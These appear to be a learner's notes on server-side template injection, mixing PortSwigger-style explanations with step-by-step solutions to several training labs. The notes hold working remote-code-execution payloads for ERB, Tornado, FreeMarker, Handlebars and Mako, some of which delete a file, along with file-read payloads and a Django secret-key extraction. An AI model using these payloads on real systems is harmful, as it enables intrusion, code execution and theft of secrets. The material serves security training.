### How do server-side template injection vulnerabilities arise? 
Server-side template injection vulnerabilities arise when user input is concatenated into templates rather than being passed in as data.

Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection. The classic example is an email that greets each user by their name, such as the following extract from a Twig template: 
```bash
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
```
This is not vulnerable to server-side template injection because the user's first name is merely passed into the template as data.

However, as templates are simply strings, web developers sometimes directly concatenate user input into templates prior to rendering. Let's take a similar example to the one above, but this time, users are able to customize parts of the email before it is sent. For example, they might be able to choose the name that is used:
```bash
$output = $twig->render("Dear " . $_GET['name']);
```
In this example, instead of a static value being passed into the template, part of the template itself is being dynamically generated using the GET parameter name. As template syntax is evaluated server-side, this potentially allows an attacker to place a server-side template injection payload inside the name parameter as follows:
```bash
http://vulnerable-website.com/?name={{bad-stuff-here}}
```
Sometimes this behavior is actually implemented intentionally. For example, some websites deliberately allow certain privileged users, such as content editors, to edit or submit custom templates by design. This clearly poses a huge security risk if an attacker is able to compromise an account with such privileges.

### Constructing a server-side template injection attack
Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process:
- Detect
- Identify
- Exploit

### Detect
As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as ${{<%[%'"}}%\. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may exist

Server-side template injection vulnerabilities occur in two distinct contexts, each of which requires its own detection method. Regardless of the results of your fuzzing attempts, it is important to also try the following context-specific approaches. If fuzzing was inconclusive, a vulnerability may still reveal itself using one of these approaches. Even if fuzzing did suggest a template injection vulnerability, you still need to identify its context in order to exploit it.

#### Plaintext context
Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line `render('Hello ' + username)` would render to something like `Hello Carlos`.

This can sometimes be exploited for XSS and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack.

For example, consider a template that contains the following vulnerable code:
```bash
render('Hello ' + username)
```
During auditing, we might test for server-side template injection by requesting a URL such as:
```bash
http://vulnerable-website.com/?username=${7*7}
```
If the resulting output contains Hello 49, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability.

Note that the specific syntax required to successfully evaluate the mathematical operation will vary depending on which template engine is being used

#### Code context
In other cases, the vulnerability is exposed by user input being placed within a template expression, as we saw earlier with our email example. This may take the form of a user-controllable variable name being placed inside a parameter, such as:
```bash
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```
On the website, the resulting URL would be something like:
```bash
http://vulnerable-website.com/?greeting=data.username
```
This would be rendered in the output to `Hello Carlos`, for example.

This context is easily missed during assessment because it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value:
```bash
http://vulnerable-website.com/?greeting=data.username<tag>
```
In the absence of XSS, this will usually either result in a blank entry in the output (just Hello with no username), encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:
```bash
http://vulnerable-website.com/?greeting=data.username}}<tag>
```
If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:
```bash
Hello Carlos<tag>
```

### Identify
Once you have detected the template injection potential, the next step is to identify the template engine.

Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.

Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version. For example, the invalid expression `<%=foobar%>` triggers the following response from the Ruby-based ERB engine: 
```bash
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```
Otherwise, you'll need to manually test different language-specific payloads and study how they are interpreted by the template engine. Using a process of elimination based on which syntax appears to be valid or invalid, you can narrow down the options quicker than you might think. A common way of doing this is to inject arbitrary mathematical operations using syntax from different template engines. You can then observe whether they are successfully evaluated. To help with this process, you can use a decision tree similar to the following:
```bash
# link to the page of web sec academy topic which contains img:
https://portswigger.net/web-security/server-side-template-injection
```

You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload {{7*'7'}} returns 49 in Twig and 7777777 in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response. 

### Exploiting server-side template injection vulnerabilities
### Learn the basic template syntax
Learning the basic syntax is obviously important, along with key functions and handling of variables. Even something as simple as learning how to embed native code blocks in the template can sometimes quickly lead to an exploit. For example, once you know that the Python-based Mako template engine is being used, achieving remote code execution could be as simple as: 
```bash
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
```

### PRACTITIONER Lab: Basic server-side template injection
Lab's description:
This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

Solution:
So we've got a request:
```bash
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
```
And is it reflected in the response:
```bash
...
<div>
Unfortunately this product is out of stock
</div>
...
```
So we now need to identify the templating engine with burp intruder: (see serverSideTemplateInjectionShort.md)

So we now run the intruder and see that the response with `<%= 7*7 %>` payload returned `49`
We can therefore send the following req:
```bash
GET /?message=<%=+system("ls")+%> HTTP/2
```
In the response we see:
```bash
...
morale.txt
true
...
```
which means that `morale.txt` that we need to delete is in current dir

So we send another req:
```bash
GET /?message=<%=+system("pwd")+%> HTTP/2
```
in the response:
```bash
/home/carlos
```

So to remove the file we do:
```bash
GET /?message=<%=+system("rm ./morale.txt")+%> HTTP/2
```

### PRACTITIONER Lab: Basic server-side template injection (code context)
Lab's description:
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

Solution:
In the lab there's an ability to change the author's display name. Here's the request that does that:
```bash
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0add004904b44737974520be00570043.web-security-academy.net
Cookie: session=LoSWdD6AbEu9H4qpnbirrCUODHJCuiNX
...

blog-post-author-display=user.name&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw
```

We're mainly interested in the `blog-post-author-display=user.name` in the req body.
When we post a new comment we see that the name of our user `Peter Wiener | 13 January 2025` is displayed above the newly created comment.
Since `blog-post-author-display=user.name` looks very suspicious (i.e. it looks like user is an object and `name` is a property on that object) we now need to figure out if we can use that for template injection. We can try to send template injection payloads from hacktricks to test if they are evaluated or we can try to trigger an error that may reveal the templating engine for us
So we send the req:
```bash
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0add004904b44737974520be00570043.web-security-academy.net
Cookie: session=LoSWdD6AbEu9H4qpnbirrCUODHJCuiNX
...

blog-post-author-display=user.doesnotexist&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw
```
And the response looks OK:
```bash
HTTP/2 302 Found
Location: /my-account
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```
But if we refresh the blog post page on which we previously posted a new comment, in the response we see the err:
```bash
Traceback (most recent call last): File "<string>", line 16, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 348, in generate return execute() File "<string>.generated.py", line 4, in _tt_execute AttributeError: User instance has no attribute 'doesnotexiste'
```

The error tells us that the TE is python's tornado TE. We can go to hacktricks and search for `tornado`:
```bash
https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection
```
From hacktricks we copy the payload for tornado TE:
```bash
{% import os %}{{os.system('whoami')}}
```

Now it is very important to have an idea what the template looks like on the server. It is probably something like:
```bash
<p>
    <img src=... >
    {{ user.name }} | {{ comment.date }}
</p>
```

And `user.name` is specified in the request body:
```bash
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0add004904b44737974520be00570043.web-security-academy.net
Cookie: session=LoSWdD6AbEu9H4qpnbirrCUODHJCuiNX
...

blog-post-author-display=user.name&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw
```

So we modify the req by adding the following:
```bash
}}{% import os %}{{os.system('whoami')}}
```
and the req becomes:
```bash
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0add004904b44737974520be00570043.web-security-academy.net
Cookie: session=LoSWdD6AbEu9H4qpnbirrCUODHJCuiNX
...

blog-post-author-display=user.name }}{% import os %}{{os.system('whoami')}}&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw
```
It is important to point out that the payload from hacktricks is prefixed with `}}` this is because on the server side we need to close the block that was opened before `user.name`, i.e. if on the server we have the template:
```bash
<p>
    <img src=... >
    {{ user.name }} | {{ comment.date }}
</p>
```
The `}}` that we prefixed the payload from hacktricks will actually close the block that is opened before `user.name` and the payload from hacktricks will open a new block.

And on the blog page where we previously saw the name of our author as `Peter Wiener | 13 January 202` after the req that we sent we now see: `carlos Peter Wiener0}}`, where `carlos` is actually our user because we ran `whoami` command

So we send the last req:
```bash
POST /my-account/change-blog-post-author-display HTTP/2
Host: 0add004904b44737974520be00570043.web-security-academy.net
Cookie: session=LoSWdD6AbEu9H4qpnbirrCUODHJCuiNX
...

blog-post-author-display=user.name }}{% import os %}{{os.system('rm ./morale.txt')}}&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw&csrf=kAd7ZGpiVCystXK4dfO7BMTtWIk0uvLw
```
And we have to refresh the page of the blog post (because when we refresh the page, the TE will evaluate the payload and will send a new html to us)

It's interesting how official lab's solution offers us to search for TI:
it tells us to modify the req body to the following:
`blog-post-author-display=user.name}}{{7*7}}`
and on the page where the username is displayed we see  `Peter Wiener49}} | ...`
This is because `7*7` was evaluated

### Read about the security implications
In addition to providing the fundamentals of how to create and use templates, the documentation may also provide some sort of "Security" section. The name of this section will vary, but it will usually outline all the potentially dangerous things that people should avoid doing with the template. This can be an invaluable resource, even acting as a kind of cheat sheet for which behaviors you should look for during auditing, as well as how to exploit them.

Even if there is no dedicated "Security" section, if a particular built-in object or function can pose a security risk, there is almost always a warning of some kind in the documentation. The warning may not provide much detail, but at the very least it should flag this particular built-in as something to investigate.

For example, in ERB, the documentation reveals that you can list all directories and then read arbitrary files as follows:
```bash
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>
```

### PRACTITIONER Lab: Server-side template injection using documentation
We first log in as a content manager. We now can edit the template on the blog post page.
We click `Edit template`
And at the bottom of the template we see:
```bash
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
```
So we try to change it to:
```bash
<p>Hurry! Only ${product.any} left of ${product.name} at ${product.price}.</p>
```
And we get an error in response which ends with the following:
```bash
	at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23) 
```
So we see that FreeMarker TE is used so we go to hacktricks:
```bash
https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection
```
And we search for FreeMarker and we copy the first payload and paste it into the template:
```bash
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("pwd")}
```
In the output we see:
```
/home/carlos 
```
So we can now remove `morale.txt`
```bash
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}
```

### PRACTITIONER Lab: Server-side template injection in an unknown language with a documented exploit
First we search for a place where user input is reflected.
When we click on product `View details` the browser makes the req:
```bash
https://0aa70089031a489a802c21eb003400c5.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock
```
And the `Unfortunately this product is out of stock` is reflected on the page
So we now send the request to intruder (see serverSideTemplateInjectionShort.md)

After the intruder's attack is run we now can see that both `{{7*7}}` and `${{7*7}}` returned 500 Internal server err with the following:
```bash
Error: Parse error on line 1:
{{7*7}}
--^
Expecting &apos;ID&apos;, &apos;STRING&apos;, &apos;NUMBER&apos;, &apos;BOOLEAN&apos;, &apos;UNDEFINED&apos;, &apos;NULL&apos;, &apos;DATA&apos;, got &apos;INVALID&apos;
    at Parser.parseError (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267:19)
    at Parser.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:336:30)
    at HandlebarsEnvironment.parse (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)
    at compileInput (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)
    at ret (/opt/node-v19.8.1-linux-x64/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)
    at [eval]:5:13
    at Script.runInThisContext (node:vm:128:12)
    at Object.runInThisContext (node:vm:306:38)
    at node:internal/process/execution:83:21
    at [eval]-wrapper:6:24

Node.js v19.8.1
```

So on [hacktricks](https://hacktricks.boitatech.com.br/pentesting-web/ssti-server-side-template-injection) we search for `handlebars` 

And we copy the payload for handlebars:
```bash
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
But since we use the GET method we actually need url encoded version of it so we send the req with the url encoded version of the payload which is prefixed with whatever we want (and now we want with some random chars e.g.: `BBB`)

So we send the req:
```bash
GET /?message=BBBB%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%77%68%6f%61%6d%69%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d HTTP/2
Host: 0aa70089031a489a802c21eb003400c5.web-security-academy.net
Cookie: session=eQbpktoVHJpIdIOUTBHAb4T617Vvl8kF
```
And in the response we search for `BBB` and we find:
```bash
<div>BBBB
      e
      2
      [object Object]
        function Function() { [native code] }
        2
        [object Object]
            [object Object]

</div>
```
It means we can't see the output of our commands because of the way this payload for handlebars works...
But we anyway can send out of band requests or we can send a command that removes morale.txt file.
Therefore we modify and url encode the payload again:
```bash
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm ./morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### Explore
At this point, you might have already stumbled across a workable exploit using the documentation. If not, the next step is to explore the environment and try to discover all the objects to which you have access.

Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:
```bash
${T(java.lang.System).getenv()}
```
This can form the basis for creating a shortlist of potentially interesting objects and methods to investigate further. Additionally, for Burp Suite Professional users, the Intruder provides a built-in wordlist for brute-forcing variable names. 

### Developer-supplied objects
It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods. As these objects can vary between different templates within the same website, be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

While server-side template injection can potentially lead to remote code execution and full takeover of the server, in practice this is not always possible to achieve. However, just because you have ruled out remote code execution, that doesn't necessarily mean there is no potential for a different kind of exploit. You can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as file path traversal, to gain access to sensitive data. 

### PRACTITIONER Lab: Server-side template injection with information disclosure via user-supplied objects
So we log in and go to a random product page and we see `edit template` button
We click on it and at the end we see:
```bash
<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.price}}.</p>
```
And now when we change it to:
```bash
<p>Hurry! Only {{product.stock}} left of {{product.name}} at {{product.ff}}.</p>
```
We don't see an err.

So we try the following payload: `${{<%[%'"}}%\`
And we get an err:
```bash
Traceback (most recent call last): File "<string>", line 11, in <module> File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__ self.nodelist = self.compile_nodelist() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist return parser.parse() File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse raise self.error(token, e) django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '<%[%'"' from '<%[%'"'
```
And we now know that there's django TE

So now we need to google: django ssti
And we see that there's `{% debug %}` which shows all the objects that we have access to

And in the output we see objects that we have access to and most importantly we can access the `settings` object. 

So we study the settings object in the Django documentation and see that it contains a `SECRET_KEY` property, which has dangerous security implications if known to an attacker.
In the template, remove the {% debug %} statement and enter the expression `{{settings.SECRET_KEY}}` 

And we copy and submit the value of the secret key

### Create a custom attack

